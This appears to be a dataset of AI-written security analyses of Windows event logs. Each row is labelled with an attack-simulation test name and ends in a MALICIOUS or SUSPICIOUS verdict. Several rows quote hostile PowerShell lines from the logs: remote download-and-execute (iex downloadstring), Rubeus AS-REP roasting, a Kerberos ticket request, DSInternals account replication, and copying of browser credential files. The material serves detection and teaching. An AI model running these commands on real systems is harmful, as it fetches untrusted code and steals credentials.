       - A PowerShell script is executed with a command line that downloads and executes a script from a GitHub repository. This behavior is highly suspicious and indicates a potential script-based attack. The PowerShell script seems to perform domain password spraying, denoting credential theft attempts.
     - **WHOAMI and HOSTNAME executions:** Generally used for gathering system information which in isolation can be normal, but when coupled with unauthorized PowerShell usage raises concerns about reconnaissance activity.

3. **Application Logs:**
   - **Windows Defender Alerts:**
     - Defender shows as active (SECURITY_PRODUCT_STATE_ON), but no explicit alerts from these logs. Active state suggests the default anti-malware protection is enabled; however, the lack of alerts given the PowerShell activity may denote an evasion technique or outdated signatures.

4. **PowerShell Logs:**
   - **PowerShell Engine State Change (Event ID: 600 and 400):**
     - Logs indicate the PowerShell session was started and abruptly stopped following the suspicious activity. This corresponds with the PowerShell execution seen in Sysmon logs.

5. **System Logs:**
   - **No Anomalous Entries Found:**
     - General system events were logged as expected with no visible malicious indicator in the system channel.

### Assessment and Resolution

The logs demonstrate clear signs of potentially unauthorized and malicious activities focusing around undesired PowerShell usage and potential system reconnaissance:

- **Malicious PowerShell Script Execution:** The execution of a PowerShell script downloaded remotely and executed indicates a strong likelihood of post-compromise activity aimed at credential access.
- **Time Manipulation & Evasion:** The time changes by `svchost.exe` may represent an attempt to evade logging accuracies, another common tactic in breach scenarios.
- **Reconnaissance Indicators:** Usage of WHOAMI, HOSTNAME, potentially ties to discovery phase by an attacker.

### Resolution: **MALICIOUS**

Given the clear execution of unauthorized PowerShell scripts aimed at domain password spraying and suspicious manipulations of system time, I assess the activity logged as **MALICIOUS**.

### Recommendations:

1. **Containment and Remediation:**
   - Immediately isolate the CEO's machine from the network to prevent further malicious activity.
   - Perform a comprehensive malware scan using updated definitions and EDR solutions.
   - Consider reimaging the host to a secure state post-analysis.

2. **Forensic Investigation:**
   - Acquire and analyze full memory and disk images to understand the scope of compromise.
   - Investigate any potential lateral movement and unauthorized accesses within the enterprise.

3. **Strengthen Monitoring:**
   - Enable enhanced logging and monitoring of PowerShell usage across the organization.
   - Deploy PowerShell Constrained Language Mode and Just Enough Administration to mitigate future risks.
   - For any further suspicious activities or new administrative commands not typically seen in the environment, reinforce review and alerting mechanisms.

4. **User Awareness and Training:**
   - Conduct a refresher program on security best practices and phishing avoidance for users.

These steps will help not only to contain this incident but also in reinforcing the organization’s defenses against future attempts."
WinPwn - Kerberoasting,"After analyzing the provided logs, here are the findings:

### Analysis:

1. **Process Execution and Command-Line Arguments:**
   - The logs show repeated execution of ""C:\Windows\System32\wevtutil.exe"" and ""C:\Windows\System32\conhost.exe"" by the user `SERVER002\admin_test`. Usage of `wevtutil.exe` by administrators might be typical, but in a security context, it warrants attention if it happens without clear documentation or during unusual times.
   - The execution of ""C:\Windows\System32\whoami.exe"" and ""C:\Windows\System32\hostname.exe"" may be normal for querying system information or verifying the running context but again, context and timing are key.
   
2. **PowerShell Execution with Suspicious Command:**
   - There is an alarming PowerShell command that attempts to download and execute a script from a remote URL (GitHub) using the command:
     ```plaintext
     powershell.exe & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), scripting -consoleoutput -noninteractive}
     ```
     This is indicative of potentially malicious activity as it suggests downloading and executing potentially unverified or malicious scripts directly onto the system. This is a common method used in attacks to execute remote scripts.

3. **Integration with System/Automated Updates:**
   - The logs indicate activities related to Microsoft Edge updates, shown with different executions of ""MicrosoftEdgeUpdate.exe"". While these are typical for system maintenance and updates, it's the repeated and specific command execution by the SYSTEM account that distinguishes routine maintenance from anomalies. However, there is no direct evidence linking this to the suspicious PowerShell activity.

4. **System and Security Events:**
   - Security logs show a time drift event, but there is no clear evidence linking this event to malicious activities in the context of this investigation.

### Assessment:

Given the analysis of these logs, especially the execution of PowerShell with high-integrity context and downloading of scripts from an external repository, there is sufficient cause for concern.

**Threats/Risks Identified:**
- Execution of external scripts via PowerShell can lead to code execution vulnerabilities and data breaches if the script is malicious.
- The possession of high privileges by the executing user increases potential impact.

### Guidance:
- Immediate action is required to isolate the machine to prevent further potential compromise.
- A thorough investigation should be carried out on the PowerShell script downloaded from the external URL to understand its contents and intention.
- Review and restrict outbound network traffic to prevent similar occurrences.
- Conduct a comprehensive security audit of the system and possibly the network to identify further risks or breaches.

### Resolution:

Resolution: **MALICIOUS**

This recommendation reflects the high certainty of the malicious nature of the PowerShell execution observed in the logs."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"Upon analyzing the provided log entries, several indicators of potentially malicious activity have been identified:

1. **PowerShell Command Execution**: 
    - The logs indicate the execution of PowerShell with a command that attempts to download and execute a script from a remote URL: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')`. Such activity suggests an attempt to run an ""Invoke-script"" which could be attempting to perform unauthorized actions on the system.
    - The command further attempts to run `asreproast /format:hashcat /nowrap`, which is commonly used in Kerberos ticket-grabbing attacks and may indicate an attempt to perform an AS-REP Roasting attack against the server.

2. **Use of `wevtutil.exe`**: 
    - `wevtutil.exe` was observed several times being used by the user `SERVER002\\admin_test`. This utility is often used for managing Windows Event Logs, which might be a sign of a potential malicious attempt to delete or tamper with event logs to cover tracks.

3. **High-Integrity Processes and Elevated Permissions**:
    - The commands executed had a ""High"" integrity level, meaning the processes had administrative privileges, which increases the risk associated with the logged activities.
    - The commands executed by `SERVER002\\admin_test` are suspicious, especially given the elevated privileges.

4. **Process Execution Pattern**:
    - The pattern of execution involving `whoami.exe`, `hostname.exe`, and `conhost.exe` seen in the logs, although these processes are benign in general, can be part of attack chains to gather information or escalate privileges.

5. **Time Discrepancies in Logs**:
    - The system time was set back as seen in the security logs, which often aligns with attempts to manipulate logs or mislead timestamp tracking of malicious activity.

In summary, these patterns, particularly the PowerShell command that downloads and executes scripts from a remote server, are highly indicative of malicious activity. The observed behavior with `whoami.exe`, `wevtutil.exe` paired with attempts to manipulate system logs raises significant security concerns about unauthorized and potentially harmful actions being taken on the host machine.

**Assessment**: MALICIOUS

**Action Items**:
- Immediately isolate the affected host to prevent further compromise.
- Conduct a thorough forensic analysis of the host to identify the scope and impact of the breach.
- Review network traffic logs and firewall rules to detect further unauthorized access.
- Reset administrative credentials used on the affected machine.
- Implement enhanced monitoring and detection rules for similar activities indicating potential exploitation.
- Notify the security response team to initiate incident response protocols and assess further threat impacts.

These actions are crucial to ensure containment, eradication, and recovery from the malicious activity identified in the logs."
WinPwn - BrowserPwn,"**Detailed Analysis:**

Upon detailed analysis of the provided Windows event logs, several observations point towards suspicious and potentially malicious activity. The logs pertain to various different categories including Security, Application, Sysmon, System, and Windows PowerShell logs. Let's consider the evidence:

1. **Sysmon Log:**
   - The execution of `powershell.exe` with the command line attempting to download and execute a script from a GitHub repository is highly suspicious. The particular command is seen within the logs:
     ```shell
     ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), browserpwn -consoleoutput -noninteractive}
     ```
     This kind of activity is often indicative of a PowerShell-based attack leveraging fileless malware tactics, where scripts are directly executed in memory without leaving traces on disk.

2. **Windows PowerShell Log:**
   - Multiple events point towards the PowerShell engine being used to execute the suspicious script, confirming the details seen in the Sysmon logs. The `HostApplication` and `CommandLine` fields show the execution of a potentially malicious script aimed at a remote resource with non-interactive flags. 

3. **Security and System Logs:**
   - The logs in these sections seem to depict normal system and security events, with no specific evidence of intrusion or anomaly on their own.

4. **Other Considerations:**
   - The Windows Defender state messages indicate normal and active protection, yet the suspicious PowerShell activity was not blocked or flagged at the time, suggesting either it was not configured to detect such actions or the script managed to evade detection.
   - Frequent execution of legitimate executables like `whoami.exe`, `svchost.exe`, and `wevtutil.exe` is observed but does not directly indicate maliciousness in them outside of the context provided by the PowerShell and Sysmon events.

**Assessment:**

Overall, the indicators of executing a remote script via PowerShell without prior authorization are clear signs of potentially malicious activity. This kind of behavior often aligns with exploitation tactics used by attackers to compromise and maintain persistence on systems.

**Resolution: MALICIOUS**

**Threats/Risks Identified:**
- Potential fileless malware executed via PowerShell, attempting to maintain unauthorized access to the system.
- Possible data exfiltration or malicious actions based on the content and purpose of the downloaded script.

**Guidance on How to Proceed:**
1. Immediately isolate the affected machine to prevent any further potential exfiltration of data or spread within the network.
2. Conduct a thorough review of network logs to detect any unusual outbound traffic potentially linked to data exfiltration.
3. Perform a detailed forensic analysis on the affected host to understand the full scope of the compromise.
4. Update network security and endpoint detection systems to flag and block similar activities in the future.
5. Review and strengthen PowerShell usage policies and logging to detect unauthorized script execution attempts.
6. Consider rotating credentials and reviewing access controls for the user and services involved."
Stage Popular Credential Files for Exfiltration,"The logs provided showcase various events on the Windows system, particularly involving process creation, privilege escalation, and command execution. I'll break down the analysis accordingly:

### Security Log Analysis:
1. **Event ID 4616 - System Time Change:** 
   - The logs show that the system time was adjusted by the `svchost.exe` process. Time changes can be a tactic used to manipulate logs or evade detection. However, this specific instance seems to lack any direct malicious intent as no other supporting evidence aligns with this action being malicious.

2. **Event ID 4634 & 4624 - Logon and Logoff Events:**
   - The user `admin_test` performed both logoff (4634) and logon (4624) actions. The logon type is 3, suggesting a network logon. However, multiple privilege assignments (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) are logged for `admin_test`, which might be typical for administrative users but merits further scrutiny if unexpected.

3. **Event ID 4672 - Privilege Elevation:**
   - `admin_test` had elevated token privileges including `SeDebugPrivilege`. This is highly privileged access, often seen in lateral movement or privilege escalation activities. 

### Sysmon Log Analysis:
1. **Execution of whoami.exe and conhost.exe:**
   - `whoami.exe` was executed by the `admin_test` user, typically a benign command to check the current user's context. However, frequent calls to `conhost.exe` as children of `whoami.exe` might suggest scripting activity or attempts to disguise malicious actions.

2. **Execution of PowerShell:**
   - A significant concern arises from the execution of a PowerShell script by `admin_test`. The command within PowerShell is attempting to collect web browser credentials (from Firefox, Chrome, Edge, Opera) and compress them into a ZIP file. This is a clear indicator of credential harvesting practices and aligns with potential data exfiltration attempts.

3. **Process Creation Events indicating Credential Harvesting:**
   - The use of `PowerShell` suggests a crafted script designed to copy credential files, demonstrating sophisticated malicious behavior likely for credential theft. This aligns with malware tactics seen in data breaches and should be regarded as highly suspicious, if not outright malicious.

### System Log Analysis:
- General kernel log events showed routine operations, except for some adjusted timings which were already observed in the Security log.

### Application Log Analysis:
- There appears to be a routine System Protection Platform service operation without clear evidence of abnormal behavior linked to the security context.

### Windows PowerShell Log Analysis:
- This corroborates the Sysmon log entries about PowerShell activity, confirming that a script was indeed executed for gathering sensitive browser data.

### Final Assessment:
The presence of commands harvesting credentials using PowerShell, combined with the elevation of privileges and system time adjustments, strongly suggests an active malicious attempt to gather sensitive data and possibly exfiltrate it.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the affected host (Server002) to prevent further unauthorized activity.
   - Reset all passwords associated with any accounts whose credentials might reside on the affected system, specifically focusing on `admin_test`.
   - Conduct a full forensic analysis to determine the method of compromise and assess the extent of any data exfiltration.

2. **Preventative Measures:**
   - Strengthening auditing and alerting on changes to system time and privilege escalations.
   - Implementing strict PowerShell logging and script block logging to monitor potentially harmful activities.
   - Reviewing endpoint detection and response (EDR) settings to ensure high sensitivity for activities like credential scraping or anomalous PowerShell invocation.

3. **Long-term Considerations:**
   - Training for users on recognizing phishing/social engineering tactics which might lead to such scripts being executed.
   - Review and potentially reduce the number of users with administrative privileges access."
WinPwn - Loot local Credentials - Wifi Credentials,"### Analysis of Logs

#### Anomalous Behavior Detected

1. **PowerShell Activity**:
   - The PowerShell log entries show a command to execute a script hosted on a public URL: `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`.
   - The script is executed with parameters to output WiFi credentials: `wificreds -consoleoutput -noninteractive`.
   - This is highly suspicious as it indicates potential credential harvesting by downloading and executing a script directly from the internet.

2. **Process Executions**:
   - Sysmon logs reveal the execution of `PowerShell.exe` with a command line that matches the PowerShell event log.
   - Processes like `wevtutil.exe` and `conhost.exe` run multiple times under the `SERVER002\admin_test` user and might signify legitimate operations or obfuscation attempts.

3. **Image Load Events**:
   - Repeated executions of `MicrosoftEdgeUpdate.exe`, which is usually legitimate, but considering the context of other activities, monitoring such scripts being used as a vector for persistence or privilege escalation is crucial.
   
4. **Time Synchronization**:
   - Windows time service entries show clock adjustments, which can be normal, but in the context of detected malicious actions, time tampering should be investigated further.

#### Indications of Malicious Activity

- **Malicious Script Execution**: Direct downloading and executing scripts via PowerShell without any indication of the file's integrity check or validation is risky and not standard IT practice.
- **Credential Theft Attempt**: The command includes functionality to retrieve and potentially exfiltrate WiFi credentials.
- **Integrity Level**: The PowerShell session was executed at a high integrity level, possibly enabling unauthorized actions with elevated privileges.

### Assessment and Resolution

**Resolution: MALICIOUS**

The logs present clear indicators of malicious activity, particularly with the PowerShell script execution designed to harvest credentials. This constitutes a significant threat to the organization's security posture.

### Guidance on How to Proceed

1. **Immediate Response**:
   - **Isolate the System**: Disconnect the affected machine from the network to prevent any potential spread or data exfiltration.
   - **Terminate Malicious Processes**: Stop the running PowerShell processes to halt any ongoing malicious activity.

2. **Investigate and Remediate**:
   - **Perform a Deep Forensic Analysis**: Further examine the system for any other indicators of compromise (IoC) and ascertain the scope of intrusion.
   - **Update Security Measures**: Ensure all systems are running the latest security patches and configurations.
   - **Review Script and Communications Logs**: Identify any data that may have been accessed or exfiltrated.

3. **Enhance Security Posture**:
   - **Implement Network Segmentation**: Improve network segmentation to limit lateral movement.
   - **Deploy Enhanced Monitoring**: Use extended detection and response (XDR) tools to monitor end-to-end activities.
   - **Conduct Security Awareness**: Sensitize employees to recognize phishing attempts and risks of executing unverified scripts.

4. **Notify Relevant Authorities**:
   - Depending on the jurisdiction and the potential data breach impact, notifying relevant data protection authorities or following company breach notification protocols may be required.

This situation demands urgent action given the high potential for credential theft and subsequent unauthorized access within the corporate network."
Trigger an authenticated RPC call to a target server with no Sign flag set,"Upon analyzing the provided event logs, I have identified the following observations and potential indicators of malicious activity:

### Observations:

1. **PowerShell Activity**:
   - The PowerShell logs indicate that `powershell.exe` was executed with a specific command: `rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null`. This command uses `rpcping` for testing RPC server connectivity, which could be benign in a legitimate administrative context but is unusual in routine PowerShell usage on a CEO's machine, especially with an internal loopback address.

2. **Sysmon Log**:
   - The Sysmon logs show multiple executions of processes such as `wevtutil.exe`, `conhost.exe`, and most notably `RpcPing.exe` on `Server002` by `admin_test`.
   - `wevtutil.exe` is typically used for event log operations, and its frequent usage can be indicative of event log manipulation which is an evasion tactic.
   - `rpcping` along with `powershell.exe` suggests testing or establishing an internal communication which may be suspicious if not part of regular operations.

3. **Edge Update Activity**:
   - There's significant logging of processes related to Microsoft Edge Update. While frequent updates may be normal, considering the timing and context of the other logs, it can be worth checking if these updates correlate with patch schedules or if they are attempts at other activities masked as updates.

4. **Command Line Usages**:
   - Multiple processes executed with high integrity levels by the `admin_test` user are seen. High integrity usually indicates privileged execution which if not scheduled or typical, may imply an abnormal context.

5. **General Observations**:
   - There is consistent process spawning and termination activity in a short time frame, which can point to script or automated task execution.

### Assessment and Risks:

- **Suspicious Behavior**:
  - The use of RPC Ping within PowerShell is unusual for day-to-day activities unless part of specific testing or administrative tasks. If not confirmed as legitimate internal testing, it might indicate lateral movement or internal reconnaissance.

- **Process Execution**:
  - Frequent execution of `wevtutil.exe` and the particular use of internal-only addresses and RPC protocols can be seen as suspicious activities if not within typically documented tasks, potentially indicating evasion or privilege escalation attempts.

- **Edge Update Executions**:
  - While probably benign, it needs verification against known software update windows or could be involved if the system is compromised.

### Conclusion:

Based on the analysis, the activities noted are **SUSPICIOUS**. There are no unequivocal signs of confirmed malicious activity without the context of expected network behaviors or allowed internal processes, but the observed activities certainly warrant further investigation. 

### Recommendations:

1. **Immediate Steps**:
   - Verify the legitimacy of the PowerShell commands, especially regarding their purpose and authorizations enabled for the admin account.
   - Confirm with the IT or network team about scheduled tasks and the use of RPC Ping and wevtutil by admin_test on that machine.
   - Check for any unauthorized changes or accesses in logs from the same timeline.

2. **Further Investigation**:
   - Monitor network traffic for any anomalous patterns or attempted connections over similar RPC ports.
   - Review account activities for admin_test to ensure no unauthorized privilege escalations or tasks have been executed.
   - Engage in threat hunting to rule out any lateral movement or persistence mechanisms on `Server002` and adjacent hosts.

3. **Preventative Measures**:
   - Implement stricter PowerShell execution policies and logging if not already enforced.
   - Regularly audit and confirm that all administrative tasks, tools, and commands are aligned with documented IT operations procedures."
Request A Single Ticket via PowerShell,"### Detailed Analysis

Upon reviewing the provided logs from different categories such as Application, Sysmon, PowerShell, and System, here are the findings:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple instances of `WindowsPowerShell` were observed (`powershell.exe`), notably:
     - Executed with a command-line argument: `\""powershell.exe\"" & {Add-Type -AssemblyName System.IdentityModel, $ComputerFQDN=$env:LogonServer.trimStart('\\') + \""\"".\"" + $env:UserDnsDomain, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \""HTTP/$ComputerFQDN\""}`
     - This use of PowerShell with encoded commands and dynamic variable resolution might indicate an attempt to gather system information or a lateral movement attempt through Kerberos tokens, which can be a TTP of adversaries.

2. **System Utilities Usage:**
   - Frequent usage of `wevtutil.exe` and `conhost.exe`:
     - `wevtutil.exe`, a legitimate system tool for querying event logs, was run several times. This could be used to clear event logs or query them for reconnaissance purposes during a compromise.
     - `conhost.exe` typically accompanies other processes handling console windows and appears alongside the PowerShell executions. High counts of these processes should be validated to ensure they were intended activities.

3. **Unusual Execution Context:**
   - Many logs are associated with the account `SERVER002\admin_test` rather than the more sensitive CEO machine context. However, the appearance of such an account with the script-like execution context may suggest use under elevated rights.
   - Several processes ran with a high integrity level, suggesting they were executed with elevated permissions, which could be a sign of privilege escalation attempts.

4. **Edge Update Processes:**
   - Various instances of `MicrosoftEdgeUpdate.exe` and related setups:
     - It is normal for legitimate software updates; however, running under `NT AUTHORITY\SYSTEM` indicates they were initiated with system-level access, which is highly elevated. Logs recorded each such executable's run with multiple parameters like `/svc`, `/regsvc`, and `/update`, reflecting typical software lifecycle tasks.

### Indicators of Malicious Activity or Compromise:

- The PowerShell command observed involves assembly loading and Kerberos token requests. Although not inherently malicious, such commands are often used in attacks involving reconnaissance or lateral movement (e.g., utilizing Kerberos tickets). 

- There is no explicit evidence indicating the Edge update process specifically was used for malicious intent, but heightened privileges are worth noting.

### Assessment

Based on the current logs analysis:

- **Resolution: SUSPICIOUS**

The activity is suspicious due to the unconventional PowerShell command usage and utilities running under elevated privileges (SYSTEM). While it is hard to assert this activity is specifically malicious without more context and potential correlation with other monitoring tools or indications, it definitely warrants further investigation to ensure system integrity and data safety.

### Recommendations:

1. **Further Investigation:**
   - Investigate the context, purpose of the PowerShell commands, and whether it aligns with expected administrative activities or policies.
   - Review any associated alerts or reports from Endpoint Detection and Response solutions to verify any flagged incidents.

2. **User Activity Audit:**
   - Conduct a user activity audit for `admin_test` to understand intended actions and whether they have privileges suitable for network-wide changes or just local host interactions.

3. **Monitor Edge Update Process:**
   - Ensure Edge Update activities are legitimate and cross-verify with recent update schedules or IT-admin intended updates.

4. **Review Log Management:**
   - Ensure that no logs have been modified or cleared unexpectedly that may suppress additional malicious activity evidence. 

As the activity is suspicious, additional steps should be taken to ensure the environment remains secure, with continuous monitoring of potentially malicious patterns."
"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","### Detailed Analysis of Event Logs:

#### Suspicious or Anomalous Behavior:

1. **Repetitive Execution of `wevtutil.exe`**:
   - The logs show multiple instances of the `wevtutil.exe` process starting under `SERVER002\admin_test`, within a very short timeframe:
     - This utility is used to retrieve and manipulate event logs. Frequent executions might be indicative of log clearing or tampering activities.
   
2. **Frequent Use of `conhost.exe`**:
   - Accompanies the `wevtutil.exe` processes often, indicating interaction with console processes. Although not suspicious in isolation, combined with frequent `wevtutil.exe` usage, warrants attention.

3. **PowerShell Execution**:
   - A PowerShell script is executed with lines downloading and executing a script from a GitHub repository:
     - The command: `""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), SharpCloud -consoleoutput -noninteractive}`
   - This type of dynamic downloading and executing of scripts is a common pattern in malicious activities, such as delivering payloads and executing them without saving to disk.

4. **Kernel Time Changes**:
   - The System and Security logs indicate that there were time changes performed by `svchost.exe`, a legitimate Windows service host process. While time adjustments can occur normally, they can also be used by attackers to manipulate timestamps in logs.

5. **Edge Update Executions**:
   - Frequent execution of Microsoft Edge Update processes and files from unusual directory locations such as `C:\Program Files (x86)\Microsoft\Temp` with update commands. The pattern might suggest these are automated update activities; however, any execution from temporary directories is often regarded with caution, as attackers may leverage such directories for transient operations.

6. **Use of `whoami.exe` and `hostname.exe`**:
   - `whoami.exe` and `hostname.exe` executions appear benign, but together with other anomalies, these could indicate reconnaissance attempts to understand user permissions and system environment.

#### Malicious Activity or Compromise Indicators:

- The use of PowerShell to download and execute scripts from an external source suggests malicious intentions, possibly leading to a security compromise.
- `wevtutil.exe` usage suggests potential tampering or information gathering towards clearing or managing security events, which can be part of cover-up activities for unwanted actions.

### Assessment:

- **Resolution**: **MALICIOUS**
  - The evidence of PowerShell scripts fetched and executed from external sources, combined with unusual frequency and patterns of utility executions (`wevtutil`, `conhost`), highly suggest malicious activity or a potential compromise.
  - Indicators point towards scripted attacks or information gathering, possibly for later privilege escalation or data exfiltration.

### Guidance on How to Proceed:

1. **Immediate Response**:
   - Disconnect the affected host (`Server002`) from the network to prevent any further data exfiltration or spread of potential malware.
   - Preserve the current system state for forensic analysis.

2. **Further Investigation**:
   - Conduct a thorough forensic investigation to understand the extent of access, determine the payload's nature, and identify other potential affected hosts.
   - Analyze network traffic logs for connections to the IPs/domains associated with PowerShell downloads.

3. **Remediation Actions**:
   - Clean and rebuild the affected system from a secure backup.
   - Implement stricter PowerShell execution policies and monitor any external script executions or downloads.
   - Review accounts with elevated privileges and reset passwords as necessary.
   - Enhance monitoring and alerting for unusual patterns of utility usage and process executions.

4. **Awareness and Policy Review**:
   - Ensure awareness training is conducted to avoid the misuse of privileged accounts.
   - Review and, if necessary, improve existing policies around network segregation, least privilege, and logging to facilitate early detection of such activities."
Hook PowerShell TLS Encrypt-Decrypt Messages,"After an initial analysis of the provided logs, several indicators suggest suspicious or potentially malicious activity:

1. **Unusual PowerShell Activity**: 
   - There is a PowerShell command execution on the event with ID 17977 showing the use of `mavinject` and `Invoke-WebRequest`. `mavinject` is used for process injection, which is a technique often employed by malware to run malicious code within the address space of legitimate processes. This indicates an attempt to execute code stealthily, potentially to evade detection.
   - The use of `Invoke-WebRequest` suggests a connection attempt to an external URL (https://www.example.com), which could be used to download additional payloads or exfiltrate data.

2. **Consistent Usage of Wevtutil**:
   - Multiple log entries show the execution of `wevtutil.exe`, a legitimate utility used to manage event logs. However, frequent invocation within a short period, especially under high integrity levels, could imply log clearing or modification to remove traces of malicious activity.

3. **Process Execution and High Privileges**:
   - There are several instances where processes such as `sppsvc.exe`, `wcprcs.exe`, and `conhost.exe` are executed with the user `SERVER002\admin_test`, who holds administrative privileges. This username is seen executing commands and processes that require elevated permissions, which can be benign, but given the context of unusual PowerShell usage, should be thoroughly reviewed.

4. **Time Modification Events**:
   - There are changes in system time noted in the security log with Event ID 4616, with the time being set back multiple times. This could be a tactic used to evade detection mechanisms that rely on timestamps. It's suspicious when combined with other potential malicious activities observed.

5. **Logon Events and Privilege Assignments**:
   - Log events indicate a historical record of privilege assignment (EventID 4672), granting various powerful privileges including `SeDebugPrivilege`, used for debugging and examining memory of sensitive processes. While usual in some administrative contexts, given the presence on a CEO machine and other context clues, it adds to the suspicion.

Given these findings, the evidence leans towards indicating malicious activity due to:
- The use of process injection with PowerShell and unusual external web requests.
- Multiple time changes for system events.
- Patterns that fit evasive behaviors potentially related to log tampering or unauthorized access attempts.

### Conclusion: MALICIOUS

**Recommendation**:
1. **Immediate Isolation**: Isolate the CEO's machine from the network to prevent potential lateral movement or data exfiltration.
   
2. **Forensic Analysis**: Conduct a deeper forensic analysis on the CEO's machine. Look for any signs of lateral movement, persistence mechanisms, and attempts at data exfiltration.
   
3. **Incident Response Actions**: Follow through with the Incident Response protocol, ensuring backup and log integrity, and preserve the evidence for a potential forensic use case.
   
4. **Alert Systems**: Ensure that threat detection tools are tuned to detect similar PowerShell activities and process injections.
   
5. **User Awareness and Training**: Reinforce user awareness, especially with high-risk users like the CEO, to recognize potential phishing or social engineering attacks which could lead to similar compromises."
Azure - Search Azure AD User Attributes for Passwords,"## Detailed Analysis:

Upon reviewing the provided logs, there are several indicators that suggest possible malicious activity on the system being investigated. Here are the notable points:

1. **PowerShell Activities**:
   - The PowerShell logs show the execution of a PowerShell script involving the `msonline` module. The script creates a credential object using an insecure method by converting a plain text string into a secure string (`ConvertTo-SecureString -String ""dataAz"" -AsPlainText -Force`). This is then used to connect to an Msol (Microsoft Online) service and iterate over all user accounts to search for properties related to passwords. The results are output to a temporary text file. 
   - Such behavior is often associated with attempts at credential harvesting, as the script intentionally collects properties that include the word ""password"" and saves them to a file, likely for unauthorized access later.

2. **Sysmon Logs**:
   - The Sysmon logs record numerous instances where `powershell.exe` is executed with a command-line that matches the suspicious activity outlined in the PowerShell logs. This provides further evidence of the script's execution.
   - Additionally, several `conhost.exe` processes are executing alongside other tools like `wevtutil.exe`, which can be used for event log manipulation. While not always malicious, their simultaneous use with suspicious PowerShell activity might suggest log tampering attempts.
   - The combination of these processes and their timings suggest they are being leveraged to either support the execution of the script, mask its execution, or remove evidence from logs.

3. **Adversary Simulation**:
   - The indicator pattern is consistent with behavior seen in adversary simulations or real attacks aiming to gather and exfiltrate sensitive information (in this case, potential password information).
   - The usage of system tools (`wevtutil`, `conhost`, etc.) in tandem with scripting languages like PowerShell is known within the context of post-exploitation activities.

## Assessment:

Given the above findings, the activity logged in the provided event logs is highly suspicious and has characteristics associated with malicious actions. The key factors such as script usage for credential gathering and potential log tampering indicate that immediate further investigation is warranted to ascertain the full scope and intent of this activity.

## Resolution: SUSPICIOUS

### Recommendations:
1. **Immediate Action**: Isolate the affected system (Server002) from the network to prevent any further compromise or potential data exfiltration.
2. **Investigate Credentials**: Verify the usage of the `admin_test` account and any suspicious activities or anomalies in logging related to this account.
3. **Examine File Artifacts**: Retrieve and investigate the output file `data.005Test1.txt` for any exfiltrated credentials or sensitive information.
4. **Review Other Systems**: Conduct a thorough investigation across other systems in the network for similar activities to rule out a broader intrusion.
5. **Audit and Harden**: Review and enhance security measures on the network, including auditing logs for unusual activities and employing PowerShell logging and endpoint protection policies."
Run DSInternals Get-ADReplAccount,"Upon analysis of the provided Windows event logs, particularly the PowerShell and Sysmon logs, the following observations can be made:

### Analysis of Logs:

#### 1. **PowerShell Activity:**
- Multiple PowerShell events are recorded within a very short duration. These events are associated with the host application `powershell.exe` executing the command: `{Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(""\\"")}`. 
- While the `Get-ADReplAccount` command is not natively recognized as a standard PowerShell command or known module, it is likely a custom or lesser-known PowerShell script or function, which may be used to interact with Active Directory data.
- The command utilizes environment variables and attempts to manipulate domain account data, which can be suspicious in nature, often related to enumeration or querying sensitive information from Active Directory.

#### 2. **Sysmon Activity:**
- Various processes have been initiated from the server ""SERVER002"" by the user ""SERVER002\\admin_test"". These include:
  - PowerShell execution (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`)
  - Console Host (`C:\\Windows\\System32\\conhost.exe`)
  - Windows Event Utility (`C:\\Windows\\System32\\wevtutil.exe`)
  - Hostname Application (`C:\\Windows\\System32\\HOSTNAME.EXE`)
  - WhoAmI application (`C:\\Windows\\System32\\whoami.exe`)

- Of particular note is the PowerShell command-line execution which matches the command noted in the PowerShell logs involving `Get-ADReplAccount`.
- The host `wsmprovhost.exe` parent process, commonly associated with Windows Remote Management, indicates potential remote sessions or script execution.
- The sequence and combination of tools such as PowerShell and retrieval utilities are often used in a reconnaissance or enumeration phase by attackers.

### Assessment:
Given the above findings, there are signs that suggest the behaviors represented in the logs are not routine or benign. The execution of potentially custom or unauthorized PowerShell scripts that query Active Directory data without much context or documentation should be treated with caution.

### Threats/Risks Identified:
- Potential enumeration or reconnaissance within Active Directory.
- Execution of potentially unauthorized scripts on a critical server associated with elevated privileges (`admin_test`).

### Guidance/Next Steps:
1. **Immediate Review:** Conduct a review of the script or activity associated with `Get-ADReplAccount`. Determine its origin, purpose, and whether it was sanctioned by the IT department.
2. **User Certification:** Verify the use and activity of the `SERVER002\\admin_test` account. Ensure that this activity aligns with their role and responsibilities.
3. **Access Controls & Auditing:** Implement tighter access controls and monitoring on accounts that can execute administrative-level scripts.
4. **Threat Intelligence:** Investigate whether similar indicators have been observed by threat intelligence platforms to identify potential malicious campaigns.

### Resolution:
Taking into account the detailed nature of activities and the use of sensitive command utilities, the resolution is:
- **SUSPICIOUS** - The logs contain activity that appears discrepancies from normal operation and warrants further investigation to determine the legitimacy of actions taken."
Simulating access to Opera Login Data,"### Detailed Analysis of the Logs

#### Suspicious Behavior Identified:

1. **Unusual PowerShell Execution:**
   - Multiple PowerShell events (Event ID 600) depict the execution of a PowerShell command targeting sensitive data. The specific command used is:
     ```powershell
     powershell.exe & {Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles""}
     ```
